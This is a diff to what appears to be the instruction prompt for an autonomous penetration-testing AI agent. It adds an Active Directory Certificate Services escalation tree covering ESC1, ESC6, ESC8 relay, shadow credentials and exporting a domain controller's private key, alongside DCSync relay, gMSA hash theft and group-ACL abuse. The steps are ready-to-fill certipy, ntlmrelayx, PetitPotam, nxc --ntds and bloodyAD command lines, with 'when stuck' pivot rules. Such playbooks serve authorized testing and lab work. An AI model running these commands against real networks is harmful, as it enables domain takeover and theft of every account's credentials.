@@ -224,27 +224,63 @@ AVAILABLE TOOLS & EXACT COMMAND SYNTAX
 CRITICAL ATTACK PATTERNS
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-DCSync via relay (GenericWrite → no RBCD):
-  ntlmrelayx.py -t ldap://<dc> --escalate-user <your-user>
-  petitpotam.py <attacker-ip> <dc-ip>           ← triggers auth from DC
-  nxc smb <dc> -u <user> -p <pass> -d <domain> --ntds
+ADCS ESCALATION DECISION TREE:
+  Step 1. certipy find -u <user>@<domain> -p <pass> -dc-ip <dc> -vulnerable
+  Step 2. Check what templates you can ENROLL in (look for "Enrollment Rights")
 
-Shadow Credentials (GenericWrite on user):
-  certipy shadow auto -u <attacker>@<domain> -p <pass> -dc-ip <dc> -target <victim>
-  certipy auth -pfx <victim>.pfx -dc-ip <dc>
-  nxc smb <dc> -u <victim> -H <hash> -d <domain> --ntds
+  ESC1 (template has "Enrollee Supplies Subject" + CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT):
+    certipy req -u <user>@<domain> -p <pass> -dc-ip <dc> -ca <ca> -template <tmpl> -upn administrator@domain
+    certipy auth -pfx administrator.pfx -dc-ip <dc>
+
+  ESC6 (CA has EDITF_ATTRIBUTESUBJECTALTNAME2 = 0x40000):
+    Same as ESC1 but applies to ALL templates (even those without enrollee supplies subject)
+    certipy req -u <user>@<domain> -p <pass> -dc-ip <dc> -ca <ca> -template User -upn administrator@domain
+    ⚠ IF UPN IN CERT ≠ requested UPN: CA may have been patched (May 2022 patch) → try ESC6 differently:
+      Try with -dns flag instead: certipy req ... -dns dc01.domain.local
+      OR try ESC6 with Machine template if you have machine account
+    ⚠ IF STILL WRONG UPN: ESC6 is blocked → switch to shadow credentials or relay attack
+
+  ESC8 (NTLM relay to AD CS HTTP endpoint):
+    ntlmrelayx.py -t http://<ca>/certsrv/certfnsh.asp --adcs --template DomainController
+    petitpotam.py <attacker-ip> <dc-ip>
+    → get DC01$.pfx → certipy auth -pfx dc01.pfx -dc-ip <dc>
+
+  Shadow Credentials (GenericWrite on user/computer):
+    certipy shadow auto -u <attacker>@<domain> -p <pass> -dc-ip <dc> -target <victim>
+    certipy auth -pfx <victim>.pfx -dc-ip <dc>
+
+  PKINIT as DC01$ (if you can access DC's KDC cert private key):
+    # Find cert thumbprints: certutil -store My (in DC WinRM session)
+    # Find key files: ls "C:/ProgramData/Microsoft/Crypto/RSA/MachineKeys/"
+    # Each .pfx cert has a matching key file — use cert serial to find it
+    # Export key: certutil -exportpfx -p "" My <thumbprint> dc01.pfx
+    certipy auth -pfx dc01.pfx -dc-ip <dc>   → get DC01$'s TGT
+    KRB5CCNAME=dc01.ccache nxc smb <dc> -u 'DC01$' --use-kcache -d <domain> --ntds
+
+DCSync via relay (GenericWrite/WriteDacl → no RBCD needed):
+  ntlmrelayx.py -t ldap://<dc> --escalate-user <your-user>
+  petitpotam.py <attacker-ip> <dc-ip>
+  nxc smb <dc> -u <user> -p <pass> -d <domain> --ntds
 
 gMSA → hash → DCSync:
   nxc ldap <dc> -u <user> -p <pass> --gmsa      ← get gMSA hash
   nxc smb <dc> -u 'gMSA$' -H <hash> -d <domain> --ntds
 
-Protected Users (NTLM blocked) → use Kerberos:
+Protected Users (NTLM blocked) → Kerberos only:
+  sudo sntp -sS <dc-ip>                          ← ALWAYS sync time first
   nxc smb <dc> -u <user> -H <hash> -d <domain> --ntds --kerberos
-  If preauth fails: try single-$ in password (some configs escape $$ → $)
 
-ACL chain (GenericAll/WriteDacl on group → add member → escalate):
+ACL chain (GenericAll/WriteDacl on group → add member):
   bloodyAD --host <dc> -d <domain> -u <user> -p <pass> add groupMember "Group Name" <target>
 
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+WHEN STUCK — MANDATORY PIVOT RULES:
+- If a certipy req returns wrong UPN 2 times → STOP, try a different template or attack
+- If ntlmrelayx captures 0 auths after 3 coerce attempts → check SMB signing, try HTTP relay instead
+- If nxc --ntds fails → try secretsdump.py (different library path) or Kerberos mode
+- If LDAP modify returns insufficientAccessRights → you don't have the ACL you think you have
+  → Re-run BloodHound: bhcli cypher to confirm actual ACLs before wasting more iterations
+- ALWAYS check privileges before assuming you can do something: whoami /priv; net user <name> /domain
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
 Methodology:
@@ -252,7 +288,7 @@ Methodology:
 2. Web: feroxbuster (dirs) → ffuf (vhosts/params) → manual review
 3. Research every service version found for CVEs immediately (/research)
 4. Try null/guest/default creds before complex exploits
-5. AD: BloodHound first (rusthound-ce + bhcli find-path), then follow ACL chains
+5. AD: BloodHound first (rusthound-ce + bhcli audit), then follow ACL chains
 6. After foothold: linpeas/winpeas → sudo/SUID/cron → identify privesc
 
 Output format:
